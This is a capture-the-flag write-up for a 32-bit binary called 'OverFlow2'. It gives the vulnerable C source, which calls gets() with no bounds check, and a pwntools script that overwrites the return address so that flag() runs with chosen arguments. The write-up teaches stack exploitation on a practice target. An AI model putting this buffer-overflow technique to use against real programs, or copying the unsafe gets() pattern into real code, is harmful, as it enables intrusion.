# OverFlow2

## Checksec

```sh
❯ checksec vuln
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

## Source Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

## Vulnerability

The vulnerability in this code is a classic buffer overflow. The `gets` function is used to read user input into the `buf` array without any bounds checking. This allows an attacker to overflow the buffer and overwrite adjacent memory, including the return address of the function. If the attacker can control the input, they can redirect execution flow to the `flag` function, which prints the flag.

## Exploit

To be note we need to overwrite the parameters of the `flag` function, which are `arg1` and `arg2`. The values we need to pass are `0xDEADBEEF` and `0xC0DED00D`.

Note that we do not use `call` to call the `flag` function, so the return address of `flag` is needed to be overwrited by us.

```python
#!/usr/bin/python3
from pwn import *

context.log_level = "debug"

context.arch = "i386"
r = process("./vuln")
# r = remote("124.16.75.117", 51008)

buf_len = 180
flag_addr = 0x080491F6
dead_beef = 0xDEADBEEF
code_dood = 0xC0DED00D
exit_addr = 0x08049241
gdb.attach(r, "b *0x080492c4")
r.sendlineafter(
    "Please enter your string: ",
    b"a" * buf_len
    + b"b" * 4  # ebx
    + b"c" * 4  # ebp
    + p32(flag_addr)
    + p32(exit_addr)  # flag_ret
    + p32(dead_beef)
    + p32(code_dood),
)
r.interactive()
```
